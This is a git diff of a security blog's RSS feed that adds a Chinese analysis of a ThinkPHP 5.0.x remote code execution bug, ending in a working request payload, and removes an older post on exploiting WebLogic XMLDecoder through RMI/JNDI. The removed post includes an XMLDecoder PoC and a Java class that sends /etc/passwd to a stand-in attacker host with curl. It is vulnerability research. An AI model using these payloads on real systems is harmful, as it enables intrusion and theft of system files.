@@ -7,8 +7,168 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>zh_cn</language>
     <copyright>Copyright © 2019 kylinking</copyright>
-    <lastBuildDate>Wed, 19 Dec 2018 16:48:02 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 12 Jan 2019 14:18:20 +0000</lastBuildDate>
     <atom:link href="https://kylingit.com/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>ThinkPHP 5.0.x 版本远程代码执行漏洞分析</title>
+      <link>https://kylingit.com/blog/thinkphp-5.0.x-%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+      <pubDate>Sat, 12 Jan 2019 14:18:20 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/thinkphp-5.0.x-%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;
+
+&lt;p&gt;1月11日，&lt;code&gt;ThinkPHP&lt;/code&gt;官方发布新版本5.0.24，修复了一个安全问题，该问题可能导致&lt;code&gt;GetShell&lt;/code&gt;，这是&lt;code&gt;ThinkPHP&lt;/code&gt;近期的第二个高危漏洞，两个漏洞均是无需登录即可远程触发，危害极大。&lt;/p&gt;
+
+&lt;p&gt;公告：&lt;a href=&#34;https://blog.thinkphp.cn/910675&#34;&gt;https://blog.thinkphp.cn/910675&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;补丁：&lt;a href=&#34;https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003&#34;&gt;https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;5.0.x ~ 5.0.23&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h3&gt;
+
+&lt;p&gt;选择&lt;code&gt;5.0.22&lt;/code&gt;版本进行复现分析&lt;/p&gt;
+
+&lt;h3 id=&#34;0x04-漏洞分析&#34;&gt;0x04 漏洞分析&lt;/h3&gt;
+
+&lt;p&gt;我们知道可以通过&lt;code&gt;http://127.0.0.1/public/index.php?s=captcha&lt;/code&gt;的方式通过&lt;code&gt;s&lt;/code&gt;参数传递具体的路由，具体调用如下&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;index.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;require __DIR__ . &#39;/../thinkphp/start.php&#39;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;start.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;App::run()-&amp;gt;send();
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;跟进&lt;code&gt;run()&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112152929.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到在进入&lt;code&gt;self::exec($dispatch, $config)&lt;/code&gt;前，&lt;code&gt;$dispatch&lt;/code&gt;的值是通过&lt;code&gt;$dispatch = self::routeCheck($request, $config)&lt;/code&gt;设置的，先进入&lt;code&gt;exec()&lt;/code&gt;方法看一下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112153147.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;exec()&lt;/code&gt;方法根据&lt;code&gt;$dispatch&lt;/code&gt;的值选择进入不同的分支，当进入&lt;code&gt;method&lt;/code&gt;分支时，调用&lt;code&gt;Request::instance()-&amp;gt;param()&lt;/code&gt;方法，跟进&lt;code&gt;param()&lt;/code&gt;，看到调用了&lt;code&gt;Request&lt;/code&gt;类的&lt;code&gt;method()&lt;/code&gt;方法 ：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$method = $this-&amp;gt;method(true);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code&gt;method()&lt;/code&gt;方法就是补丁修改的位置，在这个方法中，如果&lt;code&gt;method&lt;/code&gt;等于&lt;code&gt;true&lt;/code&gt;，则调用&lt;code&gt;$this-&amp;gt;server()&lt;/code&gt;方法：：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112153449.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;server()&lt;/code&gt;方法中调用&lt;code&gt;$this-&amp;gt;input&lt;/code&gt;方法：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112154611.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着调用了&lt;code&gt;filterValue()&lt;/code&gt;方法：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112154923.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;而&lt;code&gt;filterValue()&lt;/code&gt;则调用了&lt;code&gt;call_user_func()&lt;/code&gt;方法，如果两个参数均可控，则会造成命令执行：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112175411.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;回头看一下&lt;code&gt;$filter&lt;/code&gt;和&lt;code&gt;$value&lt;/code&gt;参数从哪里来：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$filter&lt;/code&gt;：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$filter = $this-&amp;gt;getFilter($filter, $default);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在&lt;code&gt;getFilter()&lt;/code&gt;中设置了&lt;code&gt;$filter&lt;/code&gt;值：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$filter = $filter ?: $this-&amp;gt;filter;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;也即由&lt;code&gt;$this-&amp;gt;filter&lt;/code&gt;决定&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$value&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code&gt;$value&lt;/code&gt;为第一个参数&lt;code&gt;$data&lt;/code&gt;，即为传入数组的值，由&lt;code&gt;$this-&amp;gt;server&lt;/code&gt;决定&lt;/p&gt;
+
+&lt;p&gt;所以最终的问题就是如何从请求中传入&lt;code&gt;$this-&amp;gt;filter&lt;/code&gt;和&lt;code&gt;$this-&amp;gt;server&lt;/code&gt;这两个值，构造&lt;code&gt;call_user_func()&lt;/code&gt;的参数触发漏洞。&lt;/p&gt;
+
+&lt;p&gt;回到最开始的&lt;code&gt;run()&lt;/code&gt;方法，其中：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$dispatch = self::routeCheck($request, $config);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;$dispatch&lt;/code&gt; 的值通过&lt;code&gt;routeCheck()&lt;/code&gt;方法设置，根据routeCheck()方法：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112155407.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;调用了&lt;code&gt;check()&lt;/code&gt;方法：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112155704.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;check()&lt;/code&gt;方法中根据不同的&lt;code&gt;$rules&lt;/code&gt;值返回不同的结果，而&lt;code&gt;$rules&lt;/code&gt;的值由&lt;code&gt;$method&lt;/code&gt;决定，&lt;code&gt;$method&lt;/code&gt;则由&lt;code&gt;$request-&amp;gt;method()&lt;/code&gt;返回值取小写获得，所以再次回到&lt;code&gt;$request-&amp;gt;method()&lt;/code&gt;方法，这次没有参数&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112153449.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;如果&lt;code&gt;$method&lt;/code&gt;不等于&lt;code&gt;true&lt;/code&gt;，则会取配置选项&lt;code&gt;var_method&lt;/code&gt;，该值为&lt;code&gt;_method&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112153759.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后调用&lt;code&gt;$this-&amp;gt;{$this-&amp;gt;method}($_POST);&lt;/code&gt;语句，此时假设我们控制了&lt;code&gt;$method&lt;/code&gt;的值，也就意味着可以调用&lt;code&gt;Request&lt;/code&gt;类的任意方法，而当调用构造方法&lt;code&gt;__construct()&lt;/code&gt;时，就可以覆盖&lt;code&gt;Request&lt;/code&gt;类的任意成员变量，也就是上面分析的&lt;code&gt;$this-&amp;gt;filter&lt;/code&gt;和&lt;code&gt;$this-&amp;gt;server&lt;/code&gt;两个值，同时也可以覆盖&lt;code&gt;$this-&amp;gt;method&lt;/code&gt;，直接指定了&lt;code&gt;check()&lt;/code&gt;方法中的&lt;code&gt;$method&lt;/code&gt;值。&lt;/p&gt;
+
+&lt;h3 id=&#34;0x05-构造poc&#34;&gt;0x05 构造PoC&lt;/h3&gt;
+
+&lt;p&gt;首先要主动触发&lt;code&gt;Request&lt;/code&gt;类的构造函数，通过参数&lt;code&gt;_method=__construct&lt;/code&gt;传入，进入到&lt;code&gt;__construct&lt;/code&gt;方法，该方法把参数遍历并设置值：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112163221.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;所以我们可以传入&lt;strong&gt;&lt;code&gt;filter=system&lt;/code&gt;&lt;/strong&gt;来设置&lt;code&gt;$this-&amp;gt;filter&lt;/code&gt;的值&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;此处&lt;code&gt;filter&lt;/code&gt;不是数组也可以，因为在&lt;code&gt;getFilter()&lt;/code&gt;中虽然对&lt;code&gt;filter&lt;/code&gt;是字符串的情况进行了按&lt;code&gt;,&lt;/code&gt;分割，但是传入一个值的情况下不影响最终的返回值&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;再看&lt;code&gt;$this-&amp;gt;server&lt;/code&gt;，在调用&lt;code&gt;$this-&amp;gt;server(&#39;REQUEST_METHOD&#39;)&lt;/code&gt;时指定了键值，所以通过传入&lt;code&gt;server&lt;/code&gt;数组即可&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;code&gt;server[REQUEST_METHOD]=id&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;然后我们注意到上面&lt;code&gt;check()&lt;/code&gt;方法，&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;$rules = isset(self::$rules[$method]) ? self::$rules[$method] : [];&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;它的返回值由&lt;code&gt;$rules&lt;/code&gt;决定，而&lt;code&gt;$rules&lt;/code&gt;的值取决于键值&lt;code&gt;$method&lt;/code&gt;，当我们指定&lt;code&gt;$method&lt;/code&gt;为&lt;code&gt;get&lt;/code&gt;时，可以正确获取到路由信息，从而通过&lt;code&gt;checkRoute()&lt;/code&gt;检查，此时我们通过指定&lt;strong&gt;&lt;code&gt;method=get&lt;/code&gt;&lt;/strong&gt;覆盖&lt;code&gt;$this-&amp;gt;method&lt;/code&gt;的值即可&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112173807.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;最终的&lt;code&gt;PoC&lt;/code&gt;：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;_method=__construct&amp;amp;filter=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=id&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112163746.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;调用栈如下图所示&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112175904.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x06-总结&#34;&gt;0x06 总结&lt;/h3&gt;
+
+&lt;p&gt;这个漏洞本质上是一个覆盖漏洞，通过&lt;code&gt;_method&lt;/code&gt;覆盖了配置文件的&lt;code&gt;_method&lt;/code&gt;，导致可以访问&lt;code&gt;Request&lt;/code&gt;类的任意函数，而在&lt;code&gt;Request&lt;/code&gt;的构造函数中又创建了恶意的成员变量，导致后面的命令执行，整个漏洞利用可以说是非常巧妙了。&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
     
     <item>
       <title>PrestaShop后台远程代码执行漏洞分析(CVE-2018-19126)</title>
@@ -3396,249 +3556,6 @@ function GetNum($fnum){
 &lt;p&gt;总的来说这个漏洞不算复杂，关键点就是php弱类型安全问题，这个已经有很多案例了，同时页面跳转的过程中泄露了临时的key，实际中一个尽量避免这种关键的参数泄露。&lt;/p&gt;
 
 &lt;p&gt;参考：&lt;a href=&#34;https://www.seebug.org/vuldb/ssvid-97074&#34;&gt;https://www.seebug.org/vuldb/ssvid-97074&lt;/a&gt;&lt;/p&gt;
-
-&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Weblogic XMLDecoder RCE之RMI利用</title>
-      <link>https://kylingit.com/blog/weblogic-xmldecoder-rce%E4%B9%8Brmi%E5%88%A9%E7%94%A8/</link>
-      <pubDate>Tue, 09 Jan 2018 10:45:49 +0000</pubDate>
-      
-      <guid>https://kylingit.com/blog/weblogic-xmldecoder-rce%E4%B9%8Brmi%E5%88%A9%E7%94%A8/</guid>
-      <description>
-
-&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
-
-&lt;p&gt;前阵子披露出的Weblogic XMLDecoder反序列化漏洞影响广泛，不少厂商都中了招，最近又捕获到不少利用这个漏洞进行挖矿的案例，实际上一开始在野外出现的利用就是挖矿程序，那时候漏洞还没被披露= =所以说有些时候黑产都快成为行业的风向标了，安全领域需要与黑灰色产业斗智斗勇，任重道远&amp;hellip;&lt;/p&gt;
-
-&lt;p&gt;这个漏洞的PoC写法灵活变种很多，这次来简单说一下利用java的远程方法调用(Remote Method Invocation, RMI)进行利用的方式&lt;/p&gt;
-
-&lt;h3 id=&#34;0x01-rmi简介&#34;&gt;0x01 RMI简介&lt;/h3&gt;
-
-&lt;p&gt;这里就直接贴一段网上的介绍&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。&lt;/p&gt;
-
-&lt;p&gt;对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于class path中的可序列化类来反序列化。&lt;/p&gt;
-
-&lt;p&gt;RMI的传输100%基于反序列化。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;说实话有点难理解，简单说就是我们可以在远程服务器创建一个对象，然后在本地通过rmi的方式调用这个对象，如果攻击者可以控制某个方法向攻击者的服务器发起rmi请求，从而加载恶意类，就能达到远程攻击的目的。rmi属于JNDI的一种实现方式。&lt;/p&gt;
-
-&lt;h3 id=&#34;0x02-本地调试&#34;&gt;0x02 本地调试&lt;/h3&gt;
-
-&lt;p&gt;这里我使用了@廖新喜的&lt;a href=&#34;http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/&#34;&gt;fastjson 远程反序列化&lt;/a&gt;攻击使用的PoC，里面的JNDI服务可以满足要求&lt;/p&gt;
-
-&lt;p&gt;下载&lt;a href=&#34;https://github.com/shengqi158/fastjson-remote-code-execute-poc&#34;&gt;项目&lt;/a&gt;，在IDEA中打开，我们使用的是JNDI的服务端和客户端部分&lt;/p&gt;
-
-&lt;h4 id=&#34;远程&#34;&gt;远程&lt;/h4&gt;
-
-&lt;p&gt;首先我们在远程服务器上建立一个&lt;code&gt;Exploit&lt;/code&gt;类:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;public class Exploit {
-    public Exploit(){
-        try{
-            Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;);
-        }catch(Exception e){
-            e.printStackTrace();
-        }
-    }
-    public static void main(String[] argv){
-        Exploit e = new Exploit();
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;然后编译为class:
-&lt;code&gt;/usr/lib/jvm/jdk1.7.0_79/bin/javac Exploit.java&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt; 编译&lt;code&gt;Exploit&lt;/code&gt;的java版本需要和接下来要用的本地java版本一致，否则会导致错误&lt;/p&gt;
-
-&lt;p&gt;经过测试jdk1.8版本会有异常产生，需要额外设置&lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase = True&lt;/code&gt;，所以这里建议使用jdk1.8以下版本&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/b2MmC&#34; alt=&#34;error&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;编译完成之后在VPS开启一个http服务&lt;/p&gt;
-
-&lt;h4 id=&#34;本地&#34;&gt;本地&lt;/h4&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;JNDIServer.java&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code&gt;package person.server;
-
-import com.sun.jndi.rmi.registry.ReferenceWrapper;
-
-import javax.naming.NamingException;
-import javax.naming.Reference;
-import java.rmi.AlreadyBoundException;
-import java.rmi.RemoteException;
-import java.rmi.registry.LocateRegistry;
-import java.rmi.registry.Registry;
-
-/**
- * Created by liaoxinxi on 2017-11-6.
- */
-
-public class JNDIServer {
-    public static void start() throws AlreadyBoundException, RemoteException, NamingException {
-        Registry registry = LocateRegistry.createRegistry(1099);
-        //http://xxlegend.com/Exploit.class即可
-        //factoryLocation 一定得是ip后带斜杠，这个斜杠少不得，少了的话到web服务器的请求就变成了GET / 而不是正常的GET /Exploit.class
-        Reference reference = new Reference(&amp;quot;Exploit&amp;quot;,
-                &amp;quot;Exploit&amp;quot;, &amp;quot;http://remote_server:80/&amp;quot;); //此处修改为自己的远程服务器
-        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
-        registry.bind(&amp;quot;Exploit&amp;quot;, referenceWrapper);
-
-    }
-
-    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
-        start();
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;将&lt;code&gt;factoryLocation&lt;/code&gt;指向远程&lt;code&gt;Exploit&lt;/code&gt;所在的地址，并且要以&lt;code&gt;/&lt;/code&gt;结尾，原因注释里已经说了&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;TestJNDI.java&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code&gt;package person;
-
-import javax.naming.*;
-import javax.naming.directory.DirContext;
-import javax.naming.directory.InitialDirContext;
-import java.util.Hashtable;
-
-
-/**
- * Created by liaoxinxi on 2017-9-5.
- */
-public class TestJNDI {
-    public static void testRmi() throws NamingException {
-        String url = &amp;quot;rmi://127.0.0.1:1099&amp;quot;;
-        Hashtable env = new Hashtable();
-        env.put(Context.PROVIDER_URL, url);
-        env.put(Context.INITIAL_CONTEXT_FACTORY, &amp;quot;com.sun.jndi.rmi.registry.RegistryContextFactory&amp;quot;);
-        Context context = new InitialContext(env);
-//        Object object1 = context.lookup(&amp;quot;rmi://remote_server:1099/Exploit&amp;quot;);
-        Object object = context.lookup(&amp;quot;Exploit&amp;quot;);//ok
-//        System.out.println(&amp;quot;Object:&amp;quot; + object);
-    }
-    public static void main(String[] argv) throws NamingException {
-        testRmi();
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;首先测试本地JNDI服务，先运行&lt;code&gt;JNDIServer&lt;/code&gt;，可以看到在本地监听了1099端口&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/OLArZ&#34; alt=&#34;1099&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;然后运行客户端&lt;code&gt;TestJNDI&lt;/code&gt;，可以看到VPS收到了一次请求，访问了&lt;code&gt;Exploit.class&lt;/code&gt;，接着执行了calc:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/e5ntY&#34; alt=&#34;calc&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;测试成功&lt;/p&gt;
-
-&lt;p&gt;整个流程是这样的：&lt;code&gt;lookup&lt;/code&gt;方法向JNDI服务请求&lt;code&gt;Exploit&lt;/code&gt;，JNDI绑定了一个&lt;code&gt;referenceWrapper&lt;/code&gt;，而&lt;code&gt;JNDIReferences&lt;/code&gt;加载了外部对象(远程)，外部对象包含攻击载荷，本地反序列化执行&lt;/p&gt;
-
-&lt;p&gt;那我们可不可以在远程服务器开启一个JNDI服务和http服务，使应用通过&lt;code&gt;rmi://remote_server:1099/Exploit&lt;/code&gt;远程调用呢？&lt;/p&gt;
-
-&lt;h3 id=&#34;0x03-远程利用&#34;&gt;0x03 远程利用&lt;/h3&gt;
-
-&lt;p&gt;我们把项目打成jar包上传到VPS上，然后开启一个JNDI服务和http服务&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;开启JNDI服务&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code&gt;/usr/lib/jvm/jdk1.6.0_45/bin/java -jar -Djava.rmi.server.hostname=&amp;quot;192.168.1.2&amp;quot; jnditest.jar
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;
-如果此处不指定&lt;code&gt;rmi.server.hostname&lt;/code&gt;的话会出现错误&lt;code&gt;Root exception is java.rmi.ConnectException: Connection refused to host: 127.0.0.1&lt;/code&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;开启http服务&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code&gt;python -m SimpleHTTPServer 80
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;然后修改JNDI客户端部分，让它访问rmi远程服务&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;Object object = context.lookup(&amp;quot;rmi://remote_server/Exploit&amp;quot;);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到执行成功&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/fcbQR&#34; alt=&#34;calc2&#34; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;0x04-测试weblogic&#34;&gt;0x04 测试Weblogic&lt;/h3&gt;
-
-&lt;p&gt;下面我们测试一下在实战中能否利用rmi远程代码执行
-PoC&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;&amp;lt;java version=&amp;quot;1.6.0_45&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt;
-    &amp;lt;void class=&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;&amp;gt;
-        &amp;lt;void property=&amp;quot;dataSourceName&amp;quot;&amp;gt;
-            &amp;lt;string&amp;gt;rmi://remote_server:1099/Exploit&amp;lt;/string&amp;gt;
-        &amp;lt;/void&amp;gt;
-        &amp;lt;void property=&amp;quot;autoCommit&amp;quot;&amp;gt;
-            &amp;lt;boolean&amp;gt;true&amp;lt;/boolean&amp;gt;
-        &amp;lt;/void&amp;gt;
-    &amp;lt;/void&amp;gt;
-&amp;lt;/java&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;同样的，修改rmi地址为我们自己的服务器。&lt;/p&gt;
-
-&lt;p&gt;由于vulhub搭建的Weblogic环境是基于jdk 1.6.0_45版本的，所以我们还得使用jdk 1.6重新编译项目，服务端同样也是&lt;/p&gt;
-
-&lt;p&gt;再由于目标运行在linux上，无法弹计算器，所以我们还得改Exploit类的命令部分，改成可以回显的或者反弹shell的类，这里仅供参考&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;public class Rev {
-    public Rev(){
-        try{
-            Runtime.getRuntime().exec(&amp;quot;curl -F value=@/etc/passwd remote_server:3388&amp;quot;);
-        }catch(Exception e){
-            e.printStackTrace();
-        }
-    }
-    public static void main(String[] argv){
-        Rev e = new Rev();
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;VPS上nc监听3388端口，执行成功的话会接收到目标主机的passwd信息&lt;/p&gt;
-
-&lt;p&gt;同样的，先开启JNDI和http服务，还得再监听3388，然后发送PoC&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/fjakh&#34; alt=&#34;rev&#34; /&gt;
-成功接收到信息，利用成功。&lt;/p&gt;
-
-&lt;h3 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h3&gt;
-
-&lt;p&gt;简单总结一下这个利用方式，有几个需要注意的点&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;java版本问题。编译恶意类的java版本，生成jar包的版本，目标运行的java版本需要一致，这在一定程度上限制了通用性&lt;/p&gt;
-
-&lt;p&gt;再一个，java版本不能高于7，因为在jdk1.8中做了限制，需要设置&lt;code&gt;trustURLCodebase&lt;/code&gt;为&lt;code&gt;true&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;需要指定&lt;code&gt;rmi.server.hostname&lt;/code&gt;，在这里坑了好久，一开始以为是ipv6的问题，因为在vps上绑定jndi服务后监听的是tcp6，在github上也有人提了这个问题；后来发现本地执行客户端后与远程主机是建立连接的，却卡在了这个连接上，没有消息通信，说明tcp通道是可以建立的，应该是别的地方有问题。执行后jndi服务器去找了127.0.0.1，一开始以为是本地地址，测试了一番之后发现原来是vps的127.0.0.1，说明已经执行到远程类的部分了，只不过解析地址的时候出现了错误，后来在&lt;a href=&#34;https://stackoverflow.com/questions/15685686/java-rmi-connectexception-connection-refused-to-host-127-0-1-1&#34;&gt;stackoverflow&lt;/a&gt;和&lt;a href=&#34;http://kbase.zohocorp.com/kbase/Web_NMS/Server_Framework/file_112641.html&#34;&gt;这里&lt;/a&gt;找到了答案。&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;参考：
-&lt;a href=&#34;https://www.one-tab.com/page/rruKb03ATCuYb59FcLA2HQ&#34;&gt;https://www.one-tab.com/page/rruKb03ATCuYb59FcLA2HQ&lt;/a&gt;&lt;/p&gt;
 
 &lt;script&gt;pangu.spacingPage();&lt;/script&gt;
 </description>
